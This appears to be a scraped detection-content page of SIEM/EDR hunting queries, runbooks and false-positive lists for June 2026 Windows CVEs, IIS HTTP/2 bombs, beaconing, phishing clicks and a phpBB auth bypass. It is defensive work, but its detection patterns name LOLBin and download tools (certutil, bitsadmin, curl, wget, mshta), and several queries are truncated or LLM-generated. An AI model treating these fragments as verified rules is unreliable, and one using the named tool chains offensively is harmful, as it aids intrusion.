| (ParentBaseFileName=/^ctfmon\.exe$/i AND ImageFileName=/\\(cmd|powershell|pwsh|rundll32|regsvr32|mshta)\.exe$/i) OR (ImageFileName=/\\ctfmon\.exe$/i AND IntegrityLevel=/(High|System)/i)

ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime values(Processes.process) as process values(Processes.user) as user values(Processes.process_integrity_level) as integrity_level from datamodel=Endpoint.Processes where (Processes.parent_process_name="ctfmon.exe" Processes.process_name IN ("cmd.exe","powershell.exe","pwsh.exe","rundll32.exe","regsvr32.exe","mshta.exe")) OR (Processes.process_name="ctfmon.exe" Processes.process_integrity_level IN ("high","system")) by Processes.dest Processes.parent_process_name Processes.process_name Processes.process_id _time span=1m | `drop_dm_object_name(Processes)` | where NOT match(user,"^.*\$$") | `security_content_ctime(firstTime)`

HTTP/2 Bomb DoS against IIS (CVE-2026-49160) - rapid w3wp.exe churn and HTTP.sys errors AIActions on Objectives Medium
Detects exploitation of CVE-2026-49160 / HTTP/2 Bomb by correlating spikes in IIS w3wp.exe process restarts with bursts of high TimeTaken / 5xx errors in IIS access logs - the documented symptom of HPACK/QPACK abuse exhausting server RAM in ~45 seconds. Rationale: Article gives precise behavioural fingerprint of HTTP/2 Bomb: 'IIS server was found to exhaust 64 GB RAM in about 45 seconds' and Microsoft introduced MaxHeadersCount as mitigation. While we cannot inspect HPACK header counts in standard W3C logs, the downstream symptom - rapid w3wp.exe respawn + 5xx burst - is high-signal. Correlation prevents firing on either signal alone (legitimate IIS recycle or a regular 5xx incident).
ATT&CKT1499.002 T1190
Data sourcesEndpoint.Processes Web.Web
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • IIS app-pool recycle storm following a bad deployment / config push
  • Heavy load test (k6, JMeter) against a staging IIS host
  • Memory leak in a legitimate web app causing repeated worker restarts
  • Faulty backend dependency (DB, downstream API) returning 5xx and tripping IIS rapid-fail protection
  • Antivirus scanning IIS DLLs and triggering worker timeouts
Suppression filter
| where sSiteName !startswith "STAGE-" and Computer !startswith "LOADTEST-" and not (Computer has "DEPLOY" and bin(TimeGenerated, 1h) == startofhour(TimeGenerated))
Response runbook
1. Triage: Confirm whether KB for CVE-2026-49160 is installed (DeviceTvmSoftwareVulnerabilities), check whether the MaxHeadersCount registry value exists at HKLM\System\CurrentControlSet\Services\HTTP\Parameters. Pull top source IPs from the IIS log and check geo / known scanner ranges. 2. Contain: If exploitation suspected and patch absent, set MaxHeadersCount=100 in registry and restart HTTP service; block top abusive source IPs at perimeter; failover to standby web tier if RAM exhaustion ongoing. 3. Hunt: Look for the same source IPs against other internet-facing HTTP.sys-backed services (WinRM, WebDAV, Print Spooler IPP) over the past 14d; correlate with any post-DoS scans suggesting the actor is fingerprinting before pivoting.
let WindowMin = 5m;
let WorkerChurn = DeviceProcessEvents
    | where Timestamp > ago(1h)
    | where FileName =~ "w3wp.exe"
    | summarize StartCount = count(), AnyCmd = any(ProcessCommandLine) by bin(Timestamp, WindowMin), DeviceName
    | where StartCount >= 4;
let PoolCrash = DeviceEvents
    | where Timestamp > ago(1h)
    | where ActionType has_any ("AppPoolRecycle","ProcessCrash")
    | where FileName =~ "w3wp.exe" or InitiatingProcessFileName =~ "w3wp.exe"
    | summarize CrashCount = count() by bin(Timestamp, WindowMin), DeviceName;
WorkerChurn
| join kind=leftouter PoolCrash on DeviceName, $left.Timestamp == $right.Timestamp
| project Timestamp, DeviceName, StartCount, CrashCount, SampleCmd = AnyCmd
| order by Timestamp desc
let WindowMin = 5m;
let IISErrors = W3CIISLog
    | where TimeGenerated > ago(1h)
    | summarize ReqCount = count(),
                Errors5xx = countif(scStatus >= 500),
                MaxTimeTaken = max(TimeTaken),
                DistinctSrc = dcount(cIP)
      by bin(TimeGenerated, WindowMin), Computer, sSiteName
    | where ReqCount > 500 and (Errors5xx > 50 or MaxTimeTaken > 30000);
let WorkerChurn = SecurityEvent
    | where TimeGenerated > ago(1h)
    | where EventID in (4688, 4689)
    | where (NewProcessName endswith "\\w3wp.exe") or (ProcessName endswith "\\w3wp.exe")
    | summarize Lifecycle = count() by bin(TimeGenerated, WindowMin), Computer
    | where Lifecycle >= 6;
IISErrors
| join kind=inner WorkerChurn on Computer, $left.TimeGenerated == $right.TimeGenerated
| project TimeGenerated, Computer, sSiteName, ReqCount, Errors5xx, MaxTimeTaken, DistinctSrc, WorkerLifecycle = Lifecycle
| order by TimeGenerated desc
source:windows.security @EventID:(4688 OR 4689) (@NewProcessName:(*\w3wp.exe OR *\W3WP.EXE) OR @ProcessName:(*\w3wp.exe OR *\W3WP.EXE))
#event_simpleName=ProcessRollup2 ImageFileName=/\\w3wp\.exe$/i
| groupBy([aid, ComputerName], function=count(), end=now(), span=5m)
| _count > 5

SYSTEM-level shell from network-service host (CVE-2026-45657 / 47291 / 44815 post-RCE) AIExploitation High
Hunts for the post-exploitation footprint of June 2026's three unauthenticated network-stack RCEs: cmd.exe / PowerShell / LOLBins spawned as SYSTEM from svchost.exe hosting the DHCP client service, from w3wp.exe (HTTP.sys path), or directly from the System process. No user logon should precede SYSTEM shell spawns from these parents. Rationale: Three article-named CVEs (CVE-2026-45657 TCP/IP, CVE-2026-47291 HTTP.sys, CVE-2026-44815 DHCP Client) all yield 'unauthenticated code execution over the network' per the article. The single shared post-exploitation artifact is SYSTEM-level code running from the network-service host. Scoping svchost.exe with -k Dhcp / -k tcpip / -k http in the command line and pairing with the absence of any interactive logon dramatically reduces FP versus a broad 'svchost spawns cmd' rule.
ATT&CKT1190 T1203 T1059.003
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Windows Update / TrustedInstaller invoking helpers under svchost during cumulative-update install
  • SCCM / Intune client task sequences that legitimately run cmd.exe under svchost as SYSTEM
  • Network adapter driver install or NIC team reconfiguration spawning helpers
  • Microsoft Monitoring Agent / Azure Connected Machine running diagnostic scripts via svchost
  • Telemetry-collection helpers invoked by w3wp.exe during a managed app deployment
Suppression filter
| where ChildCmd !has "TrustedInstaller" and ChildCmd !has "CcmExec" and ChildCmd !has "MMA" and ParentCmd !has "TiWorker"
Response runbook
1. Triage: Inspect ParentCmd for the svchost service group (-k Dhcp / -k tcpip-services / -k HTTP) and ChildCmd for actor commands (whoami /priv, net user /domain). Pull DeviceTvmSoftwareVulnerabilities for the host to confirm patch level for CVE-2026-45657/47291/44815. Capture any DeviceNetworkEvents from the same host in the prior 5 minutes for the inbound exploit traffic. 2. Contain: Isolate the host immediately - these are unauthenticated network RCEs and SYSTEM-level execution implies live compromise. Block the source IP at the perimeter. Snapshot disk + memory before kill. 3. Hunt: Pivot on the source IP across firewall / NDR logs for sweeping behaviour; check other internet-exposed Windows hosts in DeviceInfo (IsInternetFacing == true) for the same parent/child shape; verify whether actor dropped persistence via DeviceFileEvents and DeviceRegistryEvents in the 30 minutes after the SYSTEM shell spawn.
let SuspiciousChildren = dynamic(["cmd.exe","powershell.exe","pwsh.exe","rundll32.exe","regsvr32.exe","mshta.exe","wmic.exe","certutil.exe","bitsadmin.exe","curl.exe","wget.exe"]);
let Candidates = DeviceProcessEvents
    | where Timestamp > ago(7d)
    | where InitiatingProcessFileName in~ ("svchost.exe","w3wp.exe")
    | where FileName has_any (SuspiciousChildren)
    | where AccountSid =~ "S-1-5-18" or AccountName =~ "system"
    | where (InitiatingProcessFileName =~ "svchost.exe" and InitiatingProcessCommandLine has_any ("Dhcp","dhcp","DHCP","tcpip","Tcpip","TcpIp","http")) or InitiatingProcessFileName =~ "w3wp.exe";
let PriorLogon = DeviceLogonEvents
    | where Timestamp > ago(7d)
    | where LogonType in (2, 10, 7)
    | summarize InteractiveLogons = count() by DeviceName, bin(Timestamp, 10m);
Candidates
| join kind=leftouter PriorLogon on DeviceName, $left.Timestamp == $right.Timestamp
| where isnull(InteractiveLogons) or InteractiveLogons == 0
| project Timestamp, DeviceName, AccountName,
          ParentFile = InitiatingProcessFileName,
          ParentCmd  = InitiatingProcessCommandLine,
          ChildFile  = FileName,
          ChildCmd   = ProcessCommandLine,
          ChildIntegrity = ProcessIntegrityLevel
| order by Timestamp desc
let SuspiciousChildren = dynamic(["cmd.exe","powershell.exe","pwsh.exe","rundll32.exe","regsvr32.exe","mshta.exe","wmic.exe","certutil.exe","bitsadmin.exe"]);
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| extend ParentName = tolower(tostring(split(ParentProcessName,"\\")[-1]))
| extend ChildName  = tolower(tostring(split(NewProcessName,"\\")[-1]))
| where ParentName in ("svchost.exe","w3wp.exe")
| where ChildName in (SuspiciousChildren)
| where TargetUserSid =~ "S-1-5-18" or SubjectUserSid =~ "S-1-5-18"
| where TokenElevationType in~ ("%%1936","%%1937")
| where CommandLine !has "MsiInstaller" and CommandLine !has "WindowsAzureGuestAgent" and CommandLine !has "SystemSettingsBroker"
| project TimeGenerated, Computer, Account, ParentProcessName, NewProcessName, CommandLine, TokenElevationType
| order by TimeGenerated desc
source:windows.security @EventID:4688 @ParentProcessName:(*\svchost.exe OR *\SVCHOST.EXE OR *\w3wp.exe OR *\W3WP.EXE) @NewProcessName:(*\cmd.exe OR *\CMD.EXE OR *\powershell.exe OR *\PowerShell.exe OR *\pwsh.exe OR *\rundll32.exe OR *\regsvr32.exe OR *\mshta.exe OR *\wmic.exe OR *\certutil.exe OR *\bitsadmin.exe) @TargetUserSid:S-1-5-18 @TokenElevationType:(*1936* OR *1937*)
#event_simpleName=ProcessRollup2 ParentBaseFileName=/^(svchost|w3wp)\.exe$/i
| ImageFileName=/\\(cmd|powershell|pwsh|rundll32|regsvr32|mshta|wmic|certutil|bitsadmin|curl|wget)\.exe$/i
| UserSid="S-1-5-18" OR UserName=/SYSTEM/i
| (ParentBaseFileName=/^svchost\.exe$/i AND regex("(Dhcp|tcpip|http)", field=ParentCommandLine, flags="i")) OR ParentBaseFileName=/^w3wp\.exe$/i
| groupBy([aid, ComputerName, ImageFileName, CommandLine, ParentCommandLine], function=count())
ENDPOINT

| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime values(Processes.process) as process values(Processes.user) as user values(Processes.parent_process) as parent_cmd from datamodel=Endpoint.Processes where Processes.parent_process_name IN ("svchost.exe","w3wp.exe") Processes.process_name IN ("cmd.exe","powershell.exe","pwsh.exe","rundll32.exe","regsvr32.exe","mshta.exe","wmic.exe","certutil.exe","bitsadmin.exe","curl.exe") by Processes.dest Processes.parent_process_name Processes.process_name Processes.process_id _time span=1m | `drop_dm_object_name(Processes)` | where match(user,"(?i)SYSTEM") | where (parent_process_name="svchost.exe" AND match(parent_cmd,"(?i)(Dhcp|tcpip|http)")) OR parent_process_name="w3wp.exe"
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime values(Processes.process) as process values(Processes.user) as user values(Processes.parent_process) as parent_cmd from datamodel=Endpoint.Processes where Processes.parent_process_name IN ("svchost.exe","w3wp.exe") Processes.process_name IN ("cmd.exe","powershell.exe","pwsh.exe","rundll32.exe","regsvr32.exe","mshta.exe","wmic.exe","certutil.exe","bitsadmin.exe","curl.exe") by Processes.dest Processes.parent_process_name Processes.process_name Processes.process_id _time span=1m | `drop_dm_object_name(Processes)` | where match(user,"(?i)SYSTEM") | where (parent_process_name="svchost.exe" AND match(parent_cmd,"(?i)(Dhcp|tcpip|http)")) OR parent_process_name="w3wp.exe"
Patch compliance hunt - June 2026 critical zero-day and network-RCE CVEs AIWeaponization High
Inventory hunt surfacing endpoints in Defender TVM still vulnerable to the highest-risk CVEs from the June 2026 release: three publicly disclosed zero-days (CVE-2026-50507 bitskrieg BitLocker, CVE-2026-49160 HTTP/2 Bomb, CVE-2026-45586 GreenPlasma CTFMON) plus the unauthenticated network-stack RCEs (CVE-2026-45657, CVE-2026-47291, CVE-2026-44815). Prioritises internet-facing systems. Rationale: Eleven CVEs are explicitly named in the article (three publicly disclosed zero-days, three unauthenticated network RCEs, four BitLocker security-feature bypasses, plus the Windows Kernel LPE CVE-2025-10263 and the Secure Boot SFB CVE-2026-8863). This UC turns the patch advisory into a deployable hunt that ranks exposure by internet-facing posture and severity tier rather than treating every CVE equally - the P1 bucket maps to the highest realistic blast-radius.
ATT&CKT1190 T1068
Data sourcesVulnerabilities.Vulnerabilities
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • TVM lagging on freshly-deployed KBs (8-48h reporting delay on a patched host)
  • Air-gapped or offline endpoints showing perpetual vulnerability state with no real risk
  • Devices in WUFB pause window during corporate change-freeze (legitimate deferral, not exposure)
  • Devices reporting old OS build because Defender for Endpoint sensor hasn't refreshed inventory post-update
  • Test/lab images intentionally kept unpatched for security research
Suppression filter
| where OSPlatform != "WindowsServer2008" and MachineGroup !has "Research" and MachineGroup !has "Lab"
Response runbook
1. Triage: Sort by Priority - P1 (internet-facing + unauth RCE) must be patched within 24h. Cross-check the list against asset CMDB to identify owners. Verify that vulnerable hosts are actually reachable from untrusted networks (firewall rules + NSG/SG review). 2. Contain: For P1 hosts that cannot be patched within SLA, deploy compensating controls - block DHCP from untrusted segments, set HTTP.sys MaxHeadersCount=100 registry mitigation for the HTTP/2 Bomb risk, restrict internet exposure via host firewall. 3. Hunt: Pair this hunt with UC1/UC4 (RoguePlanet / network-RCE post-exploit) and UC2 (CTFMON LPE) to detect any in-progress exploitation on still-vulnerable hosts; review last 14d of inbound traffic to P1 hosts for early indicators of pre-exploitation reconnaissance.
let CriticalCVEs = dynamic(["CVE-2026-45657","CVE-2026-47291","CVE-2026-44815","CVE-2026-45585","CVE-2026-50507","CVE-2026-45586","CVE-2026-49160","CVE-2026-45655","CVE-2026-45658","CVE-2026-8863","CVE-2025-10263"]);
let ExposureSet = DeviceInfo
    | summarize arg_max(Timestamp, IsInternetFacing, OSPlatform, OSVersion, MachineGroup) by DeviceId, DeviceName;
DeviceTvmSoftwareVulnerabilities
| where CveId in (CriticalCVEs)
| join kind=leftouter ExposureSet on DeviceId
| extend Priority = case(
    IsInternetFacing == true and CveId in ("CVE-2026-45657","CVE-2026-47291","CVE-2026-44815","CVE-2026-49160"), "P1-InternetFacingRCE",
    CveId in ("CVE-2026-45657","CVE-2026-47291","CVE-2026-44815"), "P2-UnauthRCE",
    CveId in ("CVE-2026-50507","CVE-2026-49160","CVE-2026-45586"), "P3-PublicZeroDay",
    "P4")
| project DeviceName, OSPlatform, OSVersion, IsInternetFacing, MachineGroup, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate, Priority
| order by Priority asc, DeviceName asc
let CriticalCVEs = dynamic(["CVE-2026-45657","CVE-2026-47291","CVE-2026-44815","CVE-2026-45585","CVE-2026-50507","CVE-2026-45586","CVE-2026-49160","CVE-2026-45655","CVE-2026-45658"]);
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(7d)
| where CveId in (CriticalCVEs)
| join kind=leftouter (DeviceInfo | summarize arg_max(TimeGenerated, IsInternetFacing, OSPlatform, OSVersion) by DeviceId) on DeviceId
| extend Priority = case(
    IsInternetFacing == true and CveId in ("CVE-2026-45657","CVE-2026-47291","CVE-2026-44815","CVE-2026-49160"), "P1-InternetFacingRCE",
    CveId in ("CVE-2026-45657","CVE-2026-47291","CVE-2026-44815"), "P2-UnauthRCE",
    CveId in ("CVE-2026-50507","CVE-2026-49160","CVE-2026-45586"), "P3-PublicZeroDay",

| project TimeGenerated, DeviceName, OSPlatform, OSVersion, IsInternetFacing, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate, Priority
| order by Priority asc, DeviceName asc

Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc

title: Entra ID Consent to Third-Party OAuth Application

| `drop_dm_object_name(Authentication)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Authentication.Authentication
    where Authentication.action="success"
      AND Authentication.signature IN (
        "Consent to application",
        "Add app role assignment grant to user",

    by Authentication.user, Authentication.app, Authentication.src, Authentication.signature

Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc

| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd

10 year old critical vulnerability in phpBB affecting tens of millions of users across thousands of forums

Aikido
2026-06-10 5 use cases 2 techniques 4 kill-chain phases detected

Aikido Security discovered a critical unauthenticated authentication bypass in phpBB affecting tens of millions of users. A single HTTP request is all it takes to take over any account — a vulnerability that's been sitting in the codebase since 2014. Category: Vulnerabilities & Threats

Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration. → [LLM] Vulnerable phpBB instances (≤3.3.16 / 4.0.0-a2) exposing CVE-2026-29199 · Asset exposure — vulnerability matches article CVE(s)
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → [LLM] Unauthenticated session creation burst against phpBB OAuth/login endpoints
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] Web-server process writing PHP under phpBB content directories (post-RCE webshell drop)
Command & Control. Beacon to attacker infrastructure for control and tasking.
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → OAuth consent / suspicious app grant
Vulnerable phpBB instances (≤3.3.16 / 4.0.0-a2) exposing CVE-2026-29199 AIReconnaissance High
Inventory-based hunt that surfaces phpBB installs running versions vulnerable to the unauthenticated session-takeover bug disclosed by Aikido. Used to prioritise patching to 3.3.17 before mass exploitation begins now that the advisory is public. Rationale: Anchors on the article's explicit version cut-off (3.3.16 and 4.0.0-a2 vulnerable, 3.3.17 fixed) and the CVE assignment. TVM-based asset hunt is the right shape for a zero-day-no-IOCs disclosure — patch-state visibility now, behavioural detection once technical details land. Cross-checked against the Aikido blog and the phpBB 3.3.17 release notes referenced in the post. Cross-checked against: • https://www.aikido.dev/blog/phpbb-authentication-bypass-rce • https://www.infosecurity-magazine.com/news/phpbb-authentication-bypass/ • https://pentest-tools.com/research/phpbb-authentication-bypass
ATT&CKT1190 T1592.002
Data sourcesVulnerabilities.Vulnerabilities
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Development/staging phpBB instances intentionally pinned to an old version for compatibility testing
  • Vulnerability scanner banner-grab misidentifies a phpBB fork (e.g. phpBB-CMS bridge) with its own version scheme
  • TVM reports the bundled phpBB version inside a third-party hosting control panel (Plesk/cPanel) where the host vendor patches separately
  • Honeypot or research phpBB deliberately left unpatched
  • Internet-Archive style read-only mirror of an old forum
Suppression filter
| where not(DeviceName has_any ("-dev","-staging","-test","honeypot"))
Response runbook
1) Triage: confirm asset is internet-exposed (check public DNS, perimeter ACLs); pull the phpBB config.php to verify the live running version vs. TVM-reported. 2) Contain: if exposed and unpatched, take the forum off-line or place behind WAF rule blocking POST to /ucp.php?mode=login_external and any /user/oauth/* paths until upgraded; force-rotate the admin password and the forum_admin/forum_mod session secrets after patching. 3) Hunt: pivot to UC2 (anomalous OAuth endpoint sessions) and UC3 (PHP writes by web-server process) across the last 14 days for any sign of prior exploitation; check phpBB's admin log table for unfamiliar admin sessions or template edits.

AND phpbb_version < "3.3.17") OR phpbb_version="4.0.0-a2" | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
Unauthenticated session creation burst against phpBB OAuth/login endpoints AIExploitation Medium
Hunts the public-facing web logs for a single source IP that receives multiple distinct phpBB session cookies (phpbb3_*_sid) on unauthenticated requests to login / OAuth callback endpoints — the observable shape of mass account takeover via the CVE-2026-29199 single-request bypass. Rationale: The article confirms (a) a single unauthenticated request returns a valid session as any chosen user and (b) the default-public member list makes target selection trivial — at scale, the observable on the web tier is one source IP harvesting many sessions in a short window against ucp.php / /user/oauth/. The patched safe path /user/oauth/authenticate/... is explicitly named in the post and bracketing it covers both old and new endpoint variants. Defender Advanced Hunting has no public-web access log table so defender_kql intentionally empty. Datadog/Falcon left empty — pipeline doesn't have a confirmed phpBB web-log source path. Cross-checked against: • https://www.aikido.dev/blog/phpbb-authentication-bypass-rce • https://www.infosecurity-magazine.com/news/phpbb-authentication-bypass/
ATT&CKT1190 T1078
Data sourcesWeb.Web
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legitimate SSO/OAuth bursts after maintenance window where many users re-authenticate at once
  • Web crawler or uptime monitor that issues unauthenticated GETs to /ucp.php and gets a guest session cookie each time
  • Load tester / synthetic transaction monitor probing login flow
  • Forum migration tool re-importing user accounts via login_external path
  • Aggressive caching CDN that strips Cookie headers, causing the origin to mint a new session per hit
Suppression filter
| where cIP !in ("<load-balancer-internal-ip>", "<monitoring-egress-ip>") and csUserAgent !has_any ("Pingdom", "UptimeRobot", "StatusCake", "Site24x7")
Response runbook
1) Triage: pull all session cookies issued to the offending IP; in phpBB DB, look up phpbb_sessions.session_user_id values bound to those SIDs — if multiple distinct, non-anonymous (user_id != 1) user_ids appear, this is exploitation, not noise. 2) Contain: invalidate every session row for the affected user_ids, force password reset for those accounts (especially anyone in the founder/admin groups), and block the source IP at WAF/perimeter; if 3.3.17 not yet applied, take the forum offline immediately. 3) Hunt: pivot to UC3 for webshell drop, search phpBB_log table for admin actions from those sessions, and check for any new entries in phpbb_styles / phpbb_extensions written within the same window.
let SuspectPaths = dynamic(["/ucp.php","/user/oauth/","/user/oauth/authenticate/"]);
W3CIISLog
| where TimeGenerated > ago(7d)
| where csUriStem has_any (SuspectPaths) or csUriQuery has_any ("mode=login", "login=external", "oauth_service")
| where scStatus in (200, 302)
| summarize Hits = count(), DistinctUriCombos = dcount(strcat(csUriStem,"?",csUriQuery)), DistinctUAs = dcount(csUserAgent), SamplePaths = make_set(csUriStem, 10), SampleQueries = make_set(csUriQuery, 10) by cIP, sSiteName, bin(TimeGenerated, 10m)
| where Hits >= 20 and DistinctUriCombos >= 5
| order by TimeGenerated desc
WEB
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count dc(Web.cookie) as session_cookie_count values(Web.uri_path) as paths values(Web.user) as observed_users min(_time) as firstTime max(_time) as lastTime from datamodel=Web.Web where (Web.url="*ucp.php*" OR Web.url="*/user/oauth/*" OR Web.uri_path="*ucp.php*" OR Web.uri_path="*/user/oauth/*") AND Web.status=200 by Web.src Web.dest Web.http_user_agent | `drop_dm_object_name(Web)` | where session_cookie_count >= 5 | eval reason="5+ distinct phpBB session cookies issued to single source IP touching login/OAuth path — review for CVE-2026-29199 mass takeover" | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
| tstats summariesonly=false count dc(Web.cookie) as session_cookie_count values(Web.uri_path) as paths values(Web.user) as observed_users min(_time) as firstTime max(_time) as lastTime from datamodel=Web.Web where (Web.url="*ucp.php*" OR Web.url="*/user/oauth/*" OR Web.uri_path="*ucp.php*" OR Web.uri_path="*/user/oauth/*") AND Web.status=200 by Web.src Web.dest Web.http_user_agent | `drop_dm_object_name(Web)` | where session_cookie_count >= 5 | eval reason="5+ distinct phpBB session cookies issued to single source IP touching login/OAuth path — review for CVE-2026-29199 mass takeover" | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
Web-server process writing PHP under phpBB content directories (post-RCE webshell drop) AIInstallation Medium
